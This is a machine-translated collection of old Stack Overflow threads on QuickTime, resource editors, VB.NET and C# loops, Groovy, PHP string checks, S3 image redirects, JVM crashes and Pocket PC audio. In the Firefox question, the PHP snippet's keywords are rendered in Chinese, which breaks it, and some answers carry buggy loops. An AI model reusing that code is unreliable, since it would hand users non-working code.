* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-12-27T09:06:23.130

也许把另存为菜单？

# macos - GetMovieAudioVolumeLevels() 是否支持两个以上的音频通道？

> ID：381914
> 
> 赞同：0
> 
> 时间：2008-12-19T19:15:31.907
> 
> 标签：macos, audio, quicktime

我有一些代码使用 GetMovieAudioVolumeLevels() 在播放期间获取 QuickTime 电影的级别。

我有一个 8 音频通道 QuickTime 电影，但使用 GetMovieAudioVolumeLevels() 调用它只返回 2 个通道。我正在使用 kQTAudioMeter_DeviceMix，现在我假设因为我的 MacPro 实际上只能播放 2 个音频通道（左右），QuickTime 将 8 个通道混合到 2 个通道。

有没有人有这方面的经验？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-09T04:04:27.683

似乎“[通道会根据需要自动混音（例如，当通过立体声输出播放多通道声音时）。](http://developer.apple.com/documentation/QuickTime/RM/MovieBasics/MTOpenPlayMovies/3openplaymovies_output/chapter_1000_section_6.html "设置音频上下文") ”

SGGetChannelVolume能[满足](http://developer.apple.com/documentation/QuickTime/Reference/QTRef_SequenceGrabber/Reference/reference.html#//apple_ref/c/func/SGGetChannelVolume "QuickTime 的序列采集器参考")您的需要吗？

# visual-studio - Windows .rc 文件的免费资源编辑器？

> ID：381915
> 
> 赞同：16
> 
> 时间：2008-12-19T19:15:33.577
> 
> 标签：visual-studio, visual-c++, resources, editing

Microsoft Visual C++ Express 不包括专业版附带的内置资源编辑器。是否有任何好的、免费的替代方案可以让您直观地编辑这些 .rc 文件？

注意：我说的是 Visual C++ 用于编译资源的资源脚本源文件，而不是编译后的资源本身（即程序需要能够以与 MSVC++ 类似的方式可视化编辑菜单和对话框）。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2008-12-19T19:49:48.237

ResEdit 曾经在这里可用：[www.resedit.net](http://www.resedit.net)

但是，它目前似乎包含恶意软件。请在使用前寻找镜子或扫描它。

> ResEdit 是一个免费的 Win32 程序资源编辑器。如果您想使用对话框、图标、版本信息或其他类型的资源，您可以使用它。输出文件可以由任何 Win32 编译器编译，例如 MinGW 和 Microsoft Visual C++。要打开使用 Win32 API 符号常量的文件，您还需要 Win32 头文件（通常与编译器一起提供）。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2015-08-03T00:39:38.647

Resource Hacker 是免费的，有一个漂亮的 GUI，没有广告软件，功能齐全，下载大小为 2.7 MB，轻巧紧凑。如果您正在寻找编辑资源文件或 .exe 并且只想要一个库存资源编辑器，它会非常有用。

[http://www.angusj.com/resourcehacker/#download](http://www.angusj.com/resourcehacker/#download)

我尝试了 3 个资源编辑器，这个是最小和最快的，界面最简单，但可能没有其他建议的一些高级功能。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2008-12-19T19:20:19.667

我使用[XN 资源编辑器](http://www.wilsonc.demon.co.uk/d10resourceeditor.htm)并且对它非常满意。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-03-18T13:41:36.393

Microsoft eVC++4（可谷歌搜索，目前在[http://www.microsoft.com/downloads/details.aspx?FamilyId=1DACDB3D-50D1-41B2-A107-FA75AE960856](http://www.microsoft.com/downloads/details.aspx?FamilyId=1DACDB3D-50D1-41B2-A107-FA75AE960856)）是免费的，并带有一个内置的资源编辑器。您当然可以使用它为 MSVC++6 及更高版本（例如，MSVC++2005e、2008e）创建 .rc (etc) 文件。使用它来编辑现有的 MSVC++6 (etc) 文件并不总是那么容易，因为 eVC 是为 Windows CE 设计的，它没有定义 VC++6 使用的所有样式（例如，SS_SUNKEN），但是您可以始终手动将它们添加到您的 resource.h 文件中（通过查看 MSVC++ 附带的 .h 可以搜索适当的值，并且一旦您完成它应该“正常工作”。

编辑：我发现最好只删除不兼容的 VC++6 样式（例如，使用文本编辑器），因为某些缺少的样式会导致包含它们的窗口无法显示。

# vb.net - 这个 C# 'for' 循环的 VB.NET 等价物是什么？

> ID：381918
> 
> 赞同：3
> 
> 时间：2008-12-19T19:16:50.797
> 
> 标签：vb.net

经过两年的 C#，我的 VB.NET 有点生疏了。我有两个列表。我们称它们为 originalList 和 targetList。这是我的 C# 代码：

```
for(int i = 0; i<originalList.Count; i++)
{
    bool isMatch = false;
    foreach (string t in targetList)
    {
        if(String.Compare(originalList[i], t, true) == 0)
        {
            isMatch = true;
            break;
        }
    }
    if(isMatch)
    {
        originalList.RemoveAt(i);
        i--;
    }
} 
```

我的 VB.NET 代码是这样的：

```
Dim i as Integer
For i = 0 To originalList.Count - 1
    Dim isMatch as boolean = false
    For Each t As String In targetList
        If String.compare(originalList(i), t, true) = 0 Then
            isMatch = true
            Exit For
        End If
    Next

    If isMatch Then
        originalList.RemoveAt(i)
        i -= 1
    End If
Next 
```

但是我的 VB.NET 代码出现索引超出范围的错误。我哪里弄错了？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2008-12-19T19:31:17.260

Consider this - it's a far more elegant way of achieving what you're trying to do - and that is removing items from your original list that appear in your target list. Consider the following lists:

```
Dim OriginalList As New List(Of String)(New String() {"a", "b", "c", "d"})
Dim TargetList As New List(Of String)(New String() {"a", "b", "c"}) 
```

And here's how I'd remove all the items from the original that appear in the target...

```
OriginalList.RemoveAll(Function(OriginalItem) TargetList.Contains(OriginalItem)) 
```

Which in C# would be written:

```
OriginalList.RemoveAll(OriginalItem => TargetList.Contains(OriginalItem)); 
```

The less code you use to achieve a task, the less chance that coding bugs could be introduced.

***Side Note:*** This is very similar to an algorithm to test subsets. If you want to find out if set A is a subset of B, then you can iterate through B removing any corresponding items from A. Once you've finished iterating through B, if there are any items left in A, then it wasn't a subset of B. If there are no items left, then it was a subset of B.

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2008-12-19T19:29:48.573

The problem is how the end condition is evaluated. In C#, each time through the loop, `originalList.Count` is checked. In the VB.NET version, the end step of the loop is calculated once, at the entry into the loop.

From [MSDN](http://msdn.microsoft.com/en-us/library/5z06z1kb(VS.80).aspx): Number of Iterations. Visual Basic evaluates the iteration values start, end and step only once, before the loop begins. If your statement block changes end or step, these changes do not affect the iteration of the loop.

That said, the approach being taken is not efficient, as it is presumably using an array-backed list, which would involve lots of moving of data around. It would probably be quicker to simply copy elements to a new list if they don't match target list (doing nothing if they do), and then setting originalList = newList when you're done.

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2008-12-19T19:40:39.703

```
Dim i as integer = 0
Dim t as String

For I = originalList.Count to 1 Step -1
    for each t in targetList
       if String.compare(originalList(i), t, true) = 0 then 
          originalList.RemoveAt(I)
          exit for
       end if
    next t
Next I 
```

The For .... Step -1 is the part you are probably not familiar with as is part of the Basic heritage of VB.NET.

When traversing a collection to REMOVE items by a numerical index you want to start at the end and work your way forward. This removes any issues with the count and items being removed.

The C# Example would been clearer if it looked like this

```
for(int i = originalList.Count; i<0; i--)
{
    foreach (string t in targetList)
    {
        if(String.Compare(originalList[i], t, true) == 0)
        {
                originalList.RemoveAt(i);
                break;
        }
    }
} 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-12-19T19:25:58.207

I'd turn it into a while loop to make the condition more clear:

```
dim i as integer = 0
While i < originalList.Count
    dim isMatch as boolean = false
    for each t as string in targetList
        if String.compare(originalList(i), t, true) = 0 then
                isMatch = true
                Exit for
        end if
    next

    if isMatch then
        originalList.RemoveAt(i)
    else
        i += 1
    end if
next 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-12-19T19:47:03.060

If you're going to remove items from an enumeration inline, then be sure to iterate it backwards.

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-10-16T09:34:32.410

Use:

```
Dim i as Integer
For i = 0 To originalList.Count - 1
    Dim isMatch as boolean = false
    For Each t as string In targetList
        If String.compare(originalList(i), t, true) = 0 Then
            isMatch = true
            Exit For
        End If
    Next

    If isMatch Then
        originalList.RemoveAt(i)
        i -= 1
    End If
Next 
```

It takes up to `originalList.Count` and not `originalList.Count-1` as you wanted.

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2008-12-19T19:24:12.903

在我看来，你如何索引到你的字符串是一个问题，而不是你的 for 循环。使用调试器逐行遍历，就会发现问题。我不想让你费力，因为它会在未来帮助你。:)

* * *

## 回答 #8

> 赞同：-1
> 
> 时间：2008-12-19T19:24:23.700

If I'm following your loop correctly, and your first item in the original list is a match, then you'll remove the string from the original list at index 0 and then decrement it to -1, which isn't a valid index value when you go to check the next item.

It looks to me that you'll need to check your index count and if you go below 0, reset it to 0 be able to start at the beginning again.

# java - 如何在groovy中将输出重定向到stderr？

> ID：381920
> 
> 赞同：32
> 
> 时间：2008-12-19T19:17:06.773
> 
> 标签：java, scripting, groovy

我正在寻找一种将 groovy 脚本中的输出重定向到 stderr 的方法：

```
catch(Exception e) {
    println "Want this to go to stderr"
} 
```

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2008-12-19T21:07:32.510

就在我的脑海中，你不能做一些自我布线：

```
def printErr = System.err.&println
printErr("AHHH") 
```

但这有点手动

* * *

## 回答 #2

> 赞同：20
> 
> 时间：2008-12-19T19:24:20.987

Groovy 可以访问 JRE：

```
System.err.println "goes to stderr" 
```

虽然可能有一种更 Groovy 的方式......

* * *

## 回答 #3

> 赞同：19
> 
> 时间：2010-12-09T14:00:15.277

另一个非常紧凑的替代方案是：

```
System.err << "Want this to go to stderr" 
```

或者您可以在脚本顶部添加它

```
def err = System.err
...
err << "Want this to go to stderr" 
```

这就是我现在在我的 groovy shell 脚本中所做的

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-03-14T21:09:14.733

如果您只想输入更短的内容，这里有两个选项。首先，你可以将 java.lang.System 导入为任何你喜欢的东西，特别是像“sys”这样更短的东西：

```
import java.lang.System as sys
sys.err.println("ERROR Will Robinson") 
```

其次，您可以将 System.err 流分配给一个变量，然后将该变量用作 System.err 的别名，例如：

```
err = System.err
err.println("ERROR again Will Robinson") 
```

这样做的好处可能是 System.err 的所有功能都可以访问，因此您不必单独连接每个功能（例如 err.print、err.println 等）。

希望有一个标准的 Groovy 方式，因为特殊的重命名可能会让阅读您的代码的人感到困惑。

# .net - 如何在 .NET 中创建基于 Web 的电子邮件客户端？

> ID：381944
> 
> 赞同：0
> 
> 时间：2008-12-19T19:25:05.633
> 
> 标签：.net, email, pop3

我正在使用第 3 方组件在 .NET 中创建基于 Web 的电子邮件客户端。

我只是想确保我有正确的想法：

1.  我将首先使用 POP 拉取电子邮件
2.  然后，我将使用 MIME 组件解析从 POP 获得的每条消息，对吗？

我对第 3 方的选择是：**Nsoftware、Quiksoft 或 Dart。**

不过，我现在正在看 Nsoftware。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-19T19:39:29.410

去年我尝试了一个类似的项目，但从未走得太远。有很多现成的可靠解决方案，我接受了“编程很难。我们去购物吧！”的建议。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2011-09-30T16:45:35.500

使用 /n 软件 POP 和 MIME 组件，您是正确的。您将使用 POP 组件来检索您的消息，然后使用 MIME 组件将消息解码为其组成部分。/n 软件提供了有关使用 POP 和 MIME 组件的 IP*Works 产品示例。如果您需要进一步的帮助，他们的支持团队是一流的。

# javascript - 新的 jQuery 插件 - 获得输入和反馈的最佳方式是什么？

> ID：381946
> 
> 赞同：2
> 
> 时间：2008-12-19T19:25:26.023
> 
> 标签：javascript, jquery, plugins, jquery-plugins, new-project

我的网络应用程序需要某种功能，而且我经常使用 jQuery，所以我想我会写一个 jQuery 插件。由于这是我第一次尝试编写 jQuery 插件，我真的很想从人们那里获得反馈，或者甚至可能获得合作，以便其他人可以与我一起修改/增强我的代码。我认为第一步是设置一个项目页面（我使用了谷歌代码），但现在我正处于从其他开发人员那里获取输入的地步。

我不会在这里发布我的项目 url，因为我不确定 Stack Overflow 是否是一个合适的地方（如果是，我可以用 URL 更新这篇文章） - 但是有没有我可以发布的网站来邀请人们提供输入并可能帮助我的代码？我可以使用 Stack Overflow，还是认为这是垃圾邮件或广告？

我什至犹豫要不要发布这个问题，因为我什至没有真正问过编程问题，但它确实涉及开发周期。我搜索了谷歌，但我不确定让人们查看我的代码的正确位置。

提前致谢！

布赖恩

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-12-19T19:41:36.597

尝试[google 组](http://groups.google.com/group/jquery-en)并进入 freenode 上的#jquery irc 频道，那里的人会很高兴地查看您所做的事情。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-19T21:27:23.873

如果您不确定您的代码质量并且想要一些好的插件编写指南，请查看[learningjquery.com](http://www.learningjquery.com)上[的插件创作教程](http://www.learningjquery.com/2007/10/a-plugin-development-pattern)。

我仍在与一些概念搏斗，但我理解的部分很棒。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-19T20:05:21.167

[www.codeplex.com](http://www.codeplex.com)怎么样。您可以创建新项目并使用该项目的内置讨论组来获取反馈。

如果您链接到寻求帮助的 codeplex 项目而不是您自己的网站，我认为人们不会那么烦恼。

只是一个想法。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-19T20:15:28.230

另外，我认为将插件添加到 jQuery 站点没有任何问题。您将让人们使用它，提供反馈，然后根据需要对其进行更新。都在一个地方。:-)

# php - PHP 中的 $str == '' 和 strlen($str) == 0 有区别吗？

> ID：381947
> 
> 赞同：7
> 
> 时间：2008-12-19T19:25:31.077
> 
> 标签：php, strlen

正如标题所说： PHP 中的 $str == '' 和 strlen($str) == 0 有区别吗？是否有任何真正的速度差异，一个比另一个更好用？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2008-12-19T20:21:32.320

我发现只做 "if (!$str)" 更清楚.. 不确定 '==' 但 '!' 应该能够产生更好的优化技术，因为没有进行过类型转换，并且对于字符串、数组、布尔值、数字是安全的......

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2008-12-19T19:36:14.627

是的，有一个重要的区别。== 运算符会进行[类型转换](http://us2.php.net/language.operators.comparison)，因此它并不总是按照您的预期进行。例如，(0 == "") 返回 true。所以你假设 $str 实际上是一个字符串。如果您确定是这种情况，或者您不关心转换，那没关系。否则，您应该使用 ===，并采取措施确保您正在比较字符串。

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2008-12-19T19:37:13.613

主要区别在于 $str == '' 对于任何与空字符串等效的内容（0 和 false[等](http://us2.php.net/language.operators.comparison)）都将返回 true。

您应该使用 === 运算符来测试实际的空字符串，或者，如果您不介意转换和测试行为，只需使用 !$str （也可以考虑[empty()](http://us2.php.net/empty)，具体取决于实际意图），我发现它的意图比 $x == '' 更清晰（他是否错过了 = 符号并且实际上想要测试一个空字符串？）

仅当您确实在字符串长度之后才使用 strlen($str)。

最重要的是，为工作使用合适的工具，根据代码的意图判断哪个工具是合适的。

```
vinko@parrot:~$ cat emptytest.php
<?php
$a = "";
$b = 0;
$c = false;
$d = "Hi!";

function is_empty1($x) { return $x == ''; }
function is_empty2($x) { return strlen($x) == 0; }
function is_empty3($x) { return $x === ''; }

function check_empty($arr) {
        foreach ($arr as $v) {
                echo "value is ";
                var_dump($v);
                echo "   \$x == ''      ";
                var_dump(is_empty1($v));
                echo "   strlen($x) == 0 ";
                var_dump(is_empty2($v));
                echo "   \$x === ''     ";
                var_dump(is_empty3($v));
        }
}

check_empty(array($a,$b,$c,$d));

?>
vinko@parrot:~$ php emptytest.php
value is string(0) ""
   $x == ''      bool(true)
   strlen() == 0 bool(true)
   $x === ''     bool(true)
value is int(0)
   $x == ''      bool(true)
   strlen() == 0 bool(false)
   $x === ''     bool(false)
value is bool(false)
   $x == ''      bool(true)
   strlen() == 0 bool(true)
   $x === ''     bool(false)
value is string(3) "Hi!"
   $x == ''      bool(false)
   strlen() == 0 bool(false)
   $x === ''     bool(false) 
```

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2008-12-19T19:40:07.927

我执行了一个简单的基准测试。（我从未做过，所以这可能完全无效。）它测试 == ''、strlen() == 0、=== '' 和 strlen() === 0。

```
header('Content-type: text/plain');

// -- Testing == '';

$string = '';

$startTime = microtime(true);
for($i = 0; $i < 10000000; ++$i)
    $string == '';
$endTime = microtime(true);
echo "\$string = ''; \$string == ''; took " . ($endTime - $startTime) . " seconds\n";

$string = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa';

$startTime = microtime(true);
for($i = 0; $i < 10000000; ++$i)
    $string == '';
$endTime = microtime(true);
echo "\$string = '$string'; \$string == ''; took " . ($endTime - $startTime) . " seconds\n";

$startTime = microtime(true);
for($i = 0; $i < 10000000; ++$i)
    '' == '';
$endTime = microtime(true);
echo "'' == ''; took " . ($endTime - $startTime) . " seconds\n";

// -- Testing strlen() == 0;

$string = '';

$startTime = microtime(true);
for($i = 0; $i < 10000000; ++$i)
    strlen($string) == 0;
$endTime = microtime(true);
echo "\$string = ''; strlen(\$string) == 0; took " . ($endTime - $startTime) . " seconds\n";

$string = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa';

$startTime = microtime(true);
for($i = 0; $i < 10000000; ++$i)
    strlen($string) == 0;
$endTime = microtime(true);
echo "\$string = '$string'; strlen(\$string) == 0; took " . ($endTime - $startTime) . " seconds\n";

$startTime = microtime(true);
for($i = 0; $i < 10000000; ++$i)
    strlen('') == 0;
$endTime = microtime(true);
echo "strlen('') == ''; took " . ($endTime - $startTime) . " seconds\n";

// -- Testing === '';

$string = '';

$startTime = microtime(true);
for($i = 0; $i < 10000000; ++$i)
    $string === '';
$endTime = microtime(true);
echo "\$string = ''; \$string === ''; took " . ($endTime - $startTime) . " seconds\n";

$string = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa';

$startTime = microtime(true);
for($i = 0; $i < 10000000; ++$i)
    $string === '';
$endTime = microtime(true);
echo "\$string = '$string'; \$string === ''; took " . ($endTime - $startTime) . " seconds\n";

$startTime = microtime(true);
for($i = 0; $i < 10000000; ++$i)
    '' === '';
$endTime = microtime(true);
echo "'' === ''; took " . ($endTime - $startTime) . " seconds\n";

// -- Testing strlen() === 0;

$string = '';

$startTime = microtime(true);
for($i = 0; $i < 10000000; ++$i)
    strlen($string) === 0;
$endTime = microtime(true);
echo "\$string = ''; strlen(\$string) === 0; took " . ($endTime - $startTime) . " seconds\n";

$string = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa';

$startTime = microtime(true);
for($i = 0; $i < 10000000; ++$i)
    strlen($string) === 0;
$endTime = microtime(true);
echo "\$string = '$string'; strlen(\$string) === 0; took " . ($endTime - $startTime) . " seconds\n";

$startTime = microtime(true);
for($i = 0; $i < 10000000; ++$i)
    strlen('') === 0;
$endTime = microtime(true);
echo "strlen('') === ''; took " . ($endTime - $startTime) . " seconds\n"; 
```

结果：

```
$string = ''; $string == ''; took 1.01983308792 seconds
$string = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'; $string == ''; took 1.04193401337 seconds
'' == ''; took 1.06608295441 seconds
$string = ''; strlen($string) == 0; took 2.1510848999 seconds
$string = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'; strlen($string) == 0; took 2.27101397514 seconds
strlen('') == ''; took 2.5775551796 seconds
$string = ''; $string === ''; took 0.854554176331 seconds
$string = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'; $string === ''; took 0.714010000229 seconds
'' === ''; took 0.749495983124 seconds
$string = ''; strlen($string) === 0; took 1.9263010025 seconds
$string = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'; strlen($string) === 0; took 1.95309996605 seconds
strlen('') === ''; took 2.40874910355 seconds 
```

如您所见，与 '' 进行比较的速度大约是比较字符串长度的两倍。此外，使用 === 比使用 == 稍快，而且它是类型安全的！好的。

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2008-12-19T19:33:43.603

即使存在速度差异，也不应选择速度较快的。选一个比较清楚的。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-12-19T19:29:04.720

$str == '' 是更好的做法。PHP 可能没有太大区别，因为它知道其字符串的长度，但是如果您随后使用较低级别的语言进行一些工作，那将是一个非常糟糕的习惯。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2008-12-19T19:30:33.190

我敢肯定，速度差异太小了。最好的使用方法是可读性更强的方法。以下是另外两种选择：

```
if (empty($str)) {
    ...
}

if (!$str) {
    ...
} 
```

**注意：**如果 $str == '0'，这些都将评估为 true。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2008-12-19T19:31:12.470

也许： !strlen($str)

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2008-12-19T19:31:17.087

strlen($str) == 0 需要调用 strlen 并调用进行比较。$str == '' 只是一个比较。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2008-12-19T19:33:16.520

执行时可能会出现一些类型转换问题`$str==''`。例如，考虑`$str`is `false`(boolean) 或`0`(integer) 的情况。他们也可能是平等的。我不太确定这一点，所以你应该稍微考虑一下。安全的方法是这样做`$str===''`。

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2008-12-19T20:04:35.897

不，它们不一样（如上所述），但出于您的目的，它们可能是可以互换的。

快点？定性地说，很难想象任何一种方式的差异都会产生影响的情况，但可以看到其他更定量的答案。这里基于速度的编码可能是我们最喜欢的贬义词的一个例子，可以缩写为“pi”。

哪个最好？

这取决于您要确认的有关 $str 的断言，以及您要调用的结果。

您会看到的另一个常见模式是

!$str

这通常给出相同的结果 - 如果您只是想测试一个不可用的字符串值，无论它为什么不可用 - 这可能是合适的 - 这可能是缺乏初始化，初始化默认值，赋值等。（我不是支持或反对这种表示，顺便说一句。）请记住，您的决定可能会产生后果，并且您需要根据您编写代码的方式了解 $str 状态调用哪些后果。（请注意，我们的任何一个选项都可能没有明确涵盖 $str 值/状态。）

# php - 如何修复 Firefox 尝试“将图像另存为”.htm？

> ID：381954
> 
> 赞同：3
> 
> 时间：2008-12-19T19:29:15.767
> 
> 标签：php, firefox, redirect, mime-types

我们最近在我们的站点中实施了 Amazon S3，这导致我们改变了处理图像的方式。我们曾经调用一个控制器/fotos.php，它会从磁盘读取文件，记录一些统计数据，设置标题并将文件的内容返回为image/jpeg。

一切顺利，直到 S3。Fotos.php 现在对 Amazon 中的资源进行 302 重定向，一切正常且正常工作，但您无法在 Firefox 中保存图像，因为它将文件类型设置为 .htm。我发现了这个关于此事的讨论，这似乎是 Firefox 中的一个错误：

[https://bugs.launchpad.net/ubuntu/+source/firefox-3.0/+bug/207670](https://bugs.launchpad.net/ubuntu/+source/firefox-3.0/+bug/207670)

这是一个显示问题的 URL（尝试保存大图像）：

[http://www.viajeros.com/fotos/el-gran-lago-de-atitlan-y-sus-volcanes/132968](http://www.viajeros.com/fotos/el-gran-lago-de-atitlan-y-sus-volcanes/132968)

Internet Explorer 6 至少尝试将其保存为 Untitled.BMP。

这是我们在 fotos.php 中使用的代码片段：

```
$archivo = $fotos->ObtenerPathFotoAmazon($url, null);

如果（空（$_GET['nocache']））{
    header('HTTP/1.0 302 找到');
    header("过期时间：".gmdate("D, d MYH:i:s", time()+315360000)." GMT");
    header("缓存控制：max-age=315360000");
} 别的 {
    header('HTTP/1.0 307 临时重定向');
}

header('位置：' . AWS_BUCKET_URL . $archivo);
死;

```

您知道解决方法吗？

编辑：我们也在使用 CloudFront。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-12-19T20:26:02.123

这不是错误

S3 本身不知道您存储的对象是什么 mimetype。当您**将**对象放入 S3 中时，您还需要包含**Content-Type**和**Content-Disposition**标头（以及您可能想要的任何其他标头）。当您这样做时，当您或其他任何人**GET**是对象时，S3 将使用这些标头值进行响应

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-12-19T20:22:20.883

尝试使用 `header('Content-Type: image/jpeg');`或 指定图像的内容类型`header('Content-Type: image/png');`

也许您必须使用内容处置附件让 PHP 指定内容类型（位置将任务留给 Web 服务器）

```
$archivo = $fotos->ObtenerPathFotoAmazon( $url, null );

if (empty($_GET['nocache'])) {
   header('HTTP/1.0 302 Found');
   header("Expires: ".gmdate("D, d M Y H:i:s", time()+315360000)." GMT");
   header("Cache-Control: max-age=315360000");
} 

header('Content-Type: image/jpeg');
header("Content-Disposition: attachment; filename='$archivo'");
readfile(AWS_BUCKET_URL .$archivo);
die(); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-19T19:44:29.930

由于此错误不仅限于 Firefox（IE 也试图将其保存为错误的类型，尽管它至少意识到它是图像），我猜 S3 正在为文件返回错误的 mime 类型。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-12-20T00:13:49.730

当人们在其他论坛上提出这个问题时，我会向他们指出[这个脚本](http://elouai.com/force-download.php)的方向。您不必全部使用它，但它是正确方向的一个很好的指针。

我不会写更多，因为其他人已经回答得很好。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-12-19T19:32:26.850

我自己曾经遇到过这个问题。我认为（当时）唯一真正的解决方法是将“#.jpg”之类的内容附加到 URL 的末尾。这不应该影响您的处理，并且会强制 FF 将下载类型设置为 jpg。

# java - java 最佳调试选项

> ID：381966
> 
> 赞同：2
> 
> 时间：2008-12-19T19:31:30.380
> 
> 标签：java, debugging

我正在尝试分析发生不一致的 JVM 崩溃。当它发生时，我会得到一个 hs_err_pid312.log 文件。

我已经添加了 Thread.setDefaultUncaughtExceptionHandler(new Thread.UncaughtExceptionHandler()，但我不确定这会捕获错误。

下次发生这种情况时，我还能做些什么其他事情，我可以获得尽可能多的信息？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-20T01:05:27.070

hs_err 文件看起来非常令人生畏，但如果您知道要查找什么，它会很有帮助。您可能想查看[Java 故障排除和诊断指南](http://java.sun.com/j2se/1.5/pdf/jdk50_ts_guide.pdf)；特别是第 2.2 节。该部分描述了如何理解 HotSpot 试图告诉您的内容。第 2.2.2 节详细介绍了几个示例崩溃并暗示其背后的原因。

如果您在 hs_err 文件头中看到有关“增长数组”的内容，那么您的问题很可能是 OutOfMemoryError。通常，JVM 应该在这种情况下正常退出，但应用程序中的非守护线程可以阻止这种情况。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-19T19:51:00.167

好的，您需要查看该日志文件的内容，但总的来说（经过一番谷歌搜索）我认为这是 JVM 的热点版本在 Windows 机器上遇到不可恢复的错误的结果。大多数示例似乎是 DLL 中无法解析的符号。

# c# - 如何从 c# 中的 DataSet 获得精度和比例？

> ID：381967
> 
> 赞同：2
> 
> 时间：2008-12-19T19:31:36.900
> 
> 标签：c#, .net-3.5

我有从 xml 模式定义的模式的数据集。Scale 和 Precision 在 XML 模式中，但我似乎无法从数据集中的数据表的列中提取它们。我正在将数据写入 ESRI 形状文件，并且需要比例和精度来定义列的类型。我看到了一种从数据中获取比例和精度的方法，但是我的数据不一定具有来自 xml 文件的最大比例和精度范围内的值。

那么有没有办法从 DataSet 中提取精度和规模？

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-19T20:39:52.003

DataSet.Tables["TableName"].Columns["ColumnName"].ExtendedPreoprties["PropertyName"].ToString()。

如果您说 xml 文件没有定义比例和精度，那么，您就完蛋了。

# c++ - 使用 VSC++ 代码在 Pocket PC 上播放 mp3

> ID：381968
> 
> 赞同：3
> 
> 时间：2008-12-19T19:31:41.423
> 
> 标签：c++, mp3, pocketpc

有谁知道一些用于掌上电脑的 mp3 播放代码。
当我的应用程序加载时，我想播放 3 个 mp3，具体取决于您的登录方式。

我已经使用 VS2005 C++ 来编写我现在所拥有的代码。

我认为为桌面播放 mp3 的代码可能会完成这项工作。但我可能无法访问图书馆，这就是为什么我一直很具体。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-25T12:21:26.703

您可以使用`DirectShow`. [这](http://www.geekpage.jp/en/programming/directshow/renderfile.php)是一个示例（它播放视频文件，但完全相同的代码适用于音频）。不幸的是，Windows Mobile 缺少合适的拆分器来解码普通的 .mp3 文件，但有一种解决方法：您可以将 RIFF 标头添加到您的 MP3（生成 MPEG 压缩的 WAV 文件）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-06T19:47:12.477

我知道问题出在 C++ 中，但这是一个很好的观点。就像你说的，适用于你办公桌的代码也可以在 Pocket PC 上运行。

所以我在 C# 中使用了 Windows Mobile 应用程序，它具有提醒功能，我们使用 wmplib（Windows 媒体播放器）库来播放歌曲（包括 mp3）。

首先，您需要将 wmp.dll 添加到引用中，该引用位于 c:\Windows\System32（或您的 windows 目录）中。然后你只需要这样编码：

```
private WMPLib.WindowsMediaPlayer player = new WMPLib.WindowsMediaPlayer();
// url is the path of the file
private void PlayFile(String url)
{

    player = new WMPLib.WindowsMediaPlayer();
    player.URL = url;
    player.settings.volume = 100;
    player.controls.play();
} 
```

[这是](http://msdn.microsoft.com/en-us/library/bb262248(VS.85).aspx)此代码的参考

[对于这里](http://msdn.microsoft.com/en-us/library/bb249582(VS.85).aspx)的 C++ ，您可以找到如何操作

# c# - 如何让 C# 与 PHP 会话对话

> ID：381969
> 
> 赞同：1
> 
> 时间：2008-12-19T19:31:43.530
> 
> 标签：c#, php

我有一个想要与 PHP 购物车集成的 C# Web 应用程序，这可能吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-19T20:07:37.327

确实，这取决于细节。您希望 PHP 应用程序在您的 .NET 环境中运行吗？如果是这样，我会看看[Phalanger](http://www.php-compiler.net/doku.php)，但我认为它不会像你想要的那样工作。

您也可以在 IIS 上查看[PHP](http://www.iis.net/php)，但这也不会为您提供很多信息。

正如 annakata 提到的，我假设您最好将 PHP 脚本调用/重定向到您的 ASP.NET 网站。

